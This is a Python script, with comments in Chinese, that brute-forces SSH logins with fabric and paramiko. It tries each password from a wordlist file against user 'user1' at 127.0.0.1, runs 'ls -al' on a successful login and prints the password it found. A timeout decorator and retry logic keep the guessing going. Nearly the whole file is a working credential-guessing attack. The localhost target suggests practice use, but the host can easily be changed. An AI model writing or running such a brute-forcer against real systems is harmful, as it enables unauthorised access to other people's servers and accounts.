import fabric
import sys
import signal
import paramiko

#global
i = 0

#封装一个超时后跳过进程的函数
def Kskip(timeout):
    def wraps(func):
        def handler(signum, frame): #handler必须写signum，frame参数
            #print('[*] 连接失败')
            sys.exit()
        def mainSignal(*args, **kwargs):
            signal.signal(signal.SIGALRM, handler)
            #print('[*] 开始计时')
            #signal.alarm(timeout)
            signal.setitimer(signal.ITIMER_REAL, timeout)
            try:
                result = func(*args, **kwargs)
            finally:
                #print('[*] 执行完毕') #函数执行完毕
                signal.alarm(0)
            return result
        return mainSignal
    return wraps


def connect(password):
    conn = fabric.Connection(
        host='127.0.0.1',
        user='user1',
        connect_kwargs={'password': password}
    )
    return conn


def main():
    with open('./passwords.txt', 'r') as t:
        lines_list = t.readlines()
        for password in lines_list:
            flag = checkPassword(password)
            if flag:
                break


@Kskip(0.4)
def checkPassword(password):
    global i
    try:
        password = password.replace('\n', '')
        conn = connect(password)
        transport = conn.transport
        result = conn.run('ls -al')
    except KeyboardInterrupt:
        print('GOODBYE!')
        sys.exit()
    except (paramiko.ssh_exception.SSHException, EOFError):
        while i<5:
            try:
                checkPassword(password)
            except (paramiko.ssh_exception.SSHException, EOFError):
                i = i+1
                continue
            except:
                print('连接失败')
                return 
            else:
                return
            finally:
                if transport:
                    transport.close()
                i=0
        else:
            print("EOF错误导致跳过连接")
            return
    except:
        #print(f'{e}')
        if transport:
            transport.close()
        print(f'[ToT] 连接失败  PASSWROD: {password}')
        return 
    else:
        print(f'[^_^] 连接成功！ PASSWROD: {password}')
        #print(result.stdout)
        return True



if __name__ == '__main__':
    main()
